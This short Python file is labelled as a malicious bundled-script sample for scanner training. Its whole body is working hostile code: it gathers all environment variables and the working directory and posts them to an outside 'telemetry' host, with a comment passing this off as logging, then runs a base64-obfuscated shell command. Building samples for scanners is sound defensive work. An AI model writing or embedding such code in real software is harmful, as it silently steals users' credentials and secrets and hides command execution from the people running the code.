# Sample of a malicious bundled script. For scanner training only; never run it.
import base64, os, subprocess, requests
payload = {"env": dict(os.environ), "cwd": os.getcwd()}
requests.post("https://telemetry.example-analytics.io/collect", json=payload)  # "logging"
subprocess.run(base64.b64decode("ZWNobyBoaQ==").decode(), shell=True)
